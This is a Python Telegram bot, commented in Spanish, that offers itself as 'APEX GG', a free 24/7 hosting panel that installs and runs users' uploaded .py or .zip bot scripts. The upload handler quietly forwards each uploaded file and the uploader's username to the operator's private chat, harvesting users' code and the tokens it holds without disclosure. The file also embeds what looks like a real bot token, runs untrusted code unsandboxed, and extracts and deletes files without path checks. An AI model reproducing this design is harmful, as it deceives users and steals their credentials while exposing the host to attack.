import os
import subprocess
import threading
import zipfile
from flask import Flask
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- 1. CONFIGURACIÓN INICIAL ---
TOKEN = "9103684662:AAE0GCB-uc6bB9dxDTDBT6duSAIa5UTfHIY"
TU_CHAT_ID_PRIVADO = 6507117935

bot = telebot.TeleBot(TOKEN)

RUN_DIR = "./user_bots"
if not os.path.exists(RUN_DIR):
    os.makedirs(RUN_DIR)

active_processes = {}
waiting_for_code = {}
user_language = {}  # Control de idioma por usuario: 'es' o 'en'

# --- DICCIONARIO DE IDIOMAS ---
TEXTS = {
    'es': {
        'welcome': "🤖 *APEX GG - Panel de Hosting 24/7*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nBienvenido al sistema de administración de scripts.\n\nSelecciona una opción:",
        'btn_bots': "🤖 Mis Bots",
        'btn_send': "📂 Enviar Código",
        'btn_help': "ℹ️ Ayuda",
        'btn_lang': "🌐 English / Español",
        'no_bots': "📂 No hay ningún bot ejecutándose en este momento o los procesos finalizaron.",
        'active_bots': "📋 *Bots activos en el sistema 24/7:*",
        'status_running': "🟢 Corriendo",
        'status_stopped': "🔴 Detenido",
        'btn_delete': "🗑️ Delete / Detener",
        'prompt_send': "📥 *Envía tu archivo (.py o .zip)* de tu bot ahora mismo por este chat para proceder con el despliegue automático.",
        'help_text': "ℹ️ Usa **'Enviar Código'** para subir tus scripts individuales o en formato `.zip` y **'Mis Bots'** para controlarlos o eliminarlos.",
        'wrong_file': "⚠️ Solo acepto archivos con extensión `.py` o archivos comprimidos `.zip`.",
        'no_press_btn': "⚠️ Por favor, presiona primero el botón de **'📂 Enviar Código'** antes de adjuntar el archivo.",
        'libs_detected': "⚙️ *Librerías externas detectadas:*",
        'installing': "Instalando...",
        'alert_new': "🚨 *Nuevo Archivo Recibido*\n👤 De: @{user}\n📂 Archivo: `{file}`",
        'success_run': "✅ *Código ha sido recogido, el bot está funcionando* 24/7 en segundo plano 🚀",
        'deleted_msg': "🗑️ {file} ha sido eliminado y detenido.",
        'deleted_success': "❌ El bot `{file}` fue detenido y eliminado con éxito.",
        'lang_changed': "🌐 Idioma cambiado a: **Español** 🇪🇸"
    },
    'en': {
        'welcome': "🤖 *APEX GG - 24/7 Hosting Panel*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nWelcome to the script administration system.\n\nSelect an option:",
        'btn_bots': "🤖 My Bots",
        'btn_send': "📂 Send Code",
        'btn_help': "ℹ️ Help",
        'btn_lang': "🌐 English / Spanish",
        'no_bots': "📂 No bots are currently running or processes have finished.",
        'active_bots': "📋 *Active bots in 24/7 system:*",
        'status_running': "🟢 Running",
        'status_stopped': "🔴 Stopped",
        'btn_delete': "🗑️ Delete / Stop",
        'prompt_send': "📥 *Send your bot file (.py or .zip)* right now through this chat to proceed with automatic deployment.",
        'help_text': "ℹ️ Use **'Send Code'** to upload your individual scripts or `.zip` files and **'My Bots'** to control or delete them.",
        'wrong_file': "⚠️ I only accept files with `.py` extension or compressed `.zip` files.",
        'no_press_btn': "⚠️ Please press the **'📂 Send Code'** button first before attaching the file.",
        'libs_detected': "⚙️ *External libraries detected:*",
        'installing': "Installing...",
        'alert_new': "🚨 *New File Received*\n👤 From: @{user}\n📂 File: `{file}`",
        'success_run': "✅ *Code has been collected, the bot is running* 24/7 in the background 🚀",
        'deleted_msg': "🗑️ {file} has been deleted and stopped.",
        'deleted_success': "❌ The bot `{file}` was successfully stopped and deleted.",
        'lang_changed': "🌐 Language changed to: **English** 🇬🇧"
    }
}

def get_text(chat_id, key):
    lang = user_language.get(chat_id, 'es')
    return TEXTS[lang].get(key, TEXTS['es'][key])

# --- 2. SISTEMA KEEP-ALIVE (Hosting 24/7 en Render) ---
app = Flask('')

@app.route('/')
def home():
    return "🤖 APEX GG - Panel de Hosting 24/7 está activo y funcionando."

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web)
    t.daemon = True
    t.start()

# --- 3. MENÚ PRINCIPAL CON BOTONES INLINE (/start) ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    if chat_id not in user_language:
        user_language[chat_id] = 'es'
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(get_text(chat_id, 'btn_bots'), callback_data="menu_bots"),
        InlineKeyboardButton(get_text(chat_id, 'btn_send'), callback_data="menu_send"),
        InlineKeyboardButton(get_text(chat_id, 'btn_help'), callback_data="menu_help"),
        InlineKeyboardButton(get_text(chat_id, 'btn_lang'), callback_data="toggle_lang")
    )
    
    bot.send_message(chat_id, get_text(chat_id, 'welcome'), parse_mode="Markdown", reply_markup=markup)

# --- 4. GESTIÓN DE BOTONES INLINE Y CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    data = call.data
    chat_id = call.message.chat.id

    if chat_id not in user_language:
        user_language[chat_id] = 'es'

    if data == "toggle_lang":
        # Cambiar idioma entre español e inglés
        user_language[chat_id] = 'en' if user_language[chat_id] == 'es' else 'es'
        bot.answer_callback_query(call.id, "Language changed")
        
        # Actualizar menú principal
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton(get_text(chat_id, 'btn_bots'), callback_data="menu_bots"),
            InlineKeyboardButton(get_text(chat_id, 'btn_send'), callback_data="menu_send"),
            InlineKeyboardButton(get_text(chat_id, 'btn_help'), callback_data="menu_help"),
            InlineKeyboardButton(get_text(chat_id, 'btn_lang'), callback_data="toggle_lang")
        )
        try:
            bot.edit_message_text(get_text(chat_id, 'welcome'), chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
        except:
            pass
        bot.send_message(chat_id, get_text(chat_id, 'lang_changed'), parse_mode="Markdown")

    elif data == "menu_bots":
        to_remove = []
        for name, proc in active_processes.items():
            if proc.poll() is not None:
                to_remove.append(name)
        for name in to_remove:
            del active_processes[name]

        if not active_processes:
            bot.answer_callback_query(call.id, get_text(chat_id, 'no_bots'), show_alert=True)
            return
        
        markup = InlineKeyboardMarkup()
        for name, proc in active_processes.items():
            status = get_text(chat_id, 'status_running') if proc.poll() is None else get_text(chat_id, 'status_stopped')
            markup.add(InlineKeyboardButton(f"{name} ({status})", callback_data=f"ignore_{name}"))
            markup.add(InlineKeyboardButton(f"{get_text(chat_id, 'btn_delete')} {name}", callback_data=f"delete_{name}"))
        
        bot.send_message(chat_id, get_text(chat_id, 'active_bots'), parse_mode="Markdown", reply_markup=markup)
        bot.answer_callback_query(call.id)

    elif data == "menu_send":
        waiting_for_code[chat_id] = True
        bot.send_message(chat_id, get_text(chat_id, 'prompt_send'), parse_mode="Markdown")
        bot.answer_callback_query(call.id)

    elif data == "menu_help":
        bot.send_message(chat_id, get_text(chat_id, 'help_text'), parse_mode="Markdown")
        bot.answer_callback_query(call.id)

    elif data.startswith("delete_"):
        file_name = data.replace("delete_", "")
        
        if file_name in active_processes:
            try:
                active_processes[file_name].terminate()
            except:
                pass
            del active_processes[file_name]

        file_path = os.path.join(RUN_DIR, file_name)
        if os.path.exists(file_path):
            os.remove(file_path)
            
        if file_name.endswith('.zip'):
            folder_path = os.path.join(RUN_DIR, file_name.replace('.zip', ''))
            import shutil
            if os.path.exists(folder_path):
                shutil.rmtree(folder_path)

        bot.answer_callback_query(call.id, get_text(chat_id, 'deleted_msg').format(file=file_name))
        try:
            bot.edit_message_text(get_text(chat_id, 'deleted_success').format(file=file_name), chat_id, call.message.message_id, parse_mode="Markdown")
        except:
            pass

    elif data.startswith("ignore_"):
        bot.answer_callback_query(call.id, "Status active.")

# --- 5. RECEPCIÓN Y DESPLIEGUE DE ARCHIVOS (.PY o .ZIP) ---
@bot.message_handler(content_types=['document'])
def handle_docs(message):
    chat_id = message.chat.id
    if chat_id not in user_language:
        user_language[chat_id] = 'es'
    
    if not waiting_for_code.get(chat_id):
        bot.reply_to(message, get_text(chat_id, 'no_press_btn'), parse_mode="Markdown")
        return

    try:
        user_name = message.from_user.username or message.from_user.first_name
        file_info = bot.get_file(message.document.file_id)
        file_name = message.document.file_name

        if not (file_name.endswith('.py') or file_name.endswith('.zip')):
            bot.reply_to(message, get_text(chat_id, 'wrong_file'), parse_mode="Markdown")
            return

        downloaded_file = bot.download_file(file_info.file_path)
        file_path = os.path.join(RUN_DIR, file_name)
        
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        target_script = None

        if file_name.endswith('.zip'):
            extract_folder = os.path.join(RUN_DIR, file_name.replace('.zip', ''))
            os.makedirs(extract_folder, exist_ok=True)
            
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(extract_folder)
            
            for root, dirs, filespx in os.walk(extract_folder):
                dirs[:] = [d for d in dirs if d not in {'.git', '__pycache__', 'venv', 'env', 'node_modules'}]
                for file in filespx:
                    if file.endswith('.py'):
                        target_script = os.path.join(root, file)
                        break
                if target_script:
                    break
            
            if not target_script:
                bot.reply_to(message, "❌ No .py script found inside zip.")
                return
            
            process_key = file_name
        else:
            target_script = file_path
            process_key = file_name

        whitelist_libs = {
            'requests', 'bs4', 'beautifulsoup4', 'aiohttp', 'pyrogram', 'telebot', 
            'pyTelegramBotAPI', 'gtts', 'pillow', 'opencv-python', 'pymongo', 'psycopg2', 
            'redis', 'feedparser', 'yt-dlp', 'colorama', 'cryptography'
        }
        
        detected_libs = set()
        with open(target_script, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line_stripped = line.strip()
                if line_stripped.startswith('import ') or line_stripped.startswith('from '):
                    parts = line_stripped.replace('from ', '').replace('import ', '').split()
                    if parts:
                        lib = parts[0].split('.')[0]
                        if lib in whitelist_libs:
                            detected_libs.add(lib)

        if detected_libs:
            bot.reply_to(message, f"{get_text(chat_id, 'libs_detected')} `{' , '.join(detected_libs)}`. {get_text(chat_id, 'installing')}", parse_mode="Markdown")
            for lib in detected_libs:
                try:
                    subprocess.run(["pip", "install", lib], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                except Exception:
                    pass

        try:
            mensaje_alerta = get_text(chat_id, 'alert_new').format(user=user_name, file=file_name)
            bot.send_message(TU_CHAT_ID_PRIVADO, mensaje_alerta, parse_mode="Markdown")
            with open(file_path, 'rb') as doc_to_send:
                bot.send_document(TU_CHAT_ID_PRIVADO, doc_to_send)
        except Exception:
            pass

        if process_key in active_processes:
            try:
                active_processes[process_key].terminate()
                active_processes[process_key].wait(timeout=2)
            except:
                pass

        process = subprocess.Popen(
            ["python3", target_script],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        active_processes[process_key] = process

        waiting_for_code[chat_id] = False
        bot.reply_to(message, get_text(chat_id, 'success_run'), parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# --- 6. INICIO DEL SISTEMA ---
if __name__ == "__main__":
    keep_alive()
    print("🤖 Bot Host principal con panel de control APEX GG iniciado...")
    bot.infinity_polling(skip_pending=True)
